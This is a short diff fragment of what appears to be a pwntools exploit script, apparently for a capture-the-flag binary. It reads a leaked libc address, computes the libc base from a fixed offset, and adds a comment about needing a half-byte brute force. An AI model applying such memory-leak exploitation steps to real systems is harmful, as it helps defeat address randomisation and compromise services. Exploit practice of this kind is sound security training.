@@ -46,6 +46,8 @@ r.sendline ("2")
 r.recvline ()
 leak = r.recvline ()[:-1]
 libc_leak = u64 ("\x00" * 2 + leak + "\x00" * 2)
+
+# need 0.5 byte brute force
 print "libc_leak: " + hex (libc_leak)
 libc_offset = 0x3ba000
 libc_base = libc_leak - libc_offset 
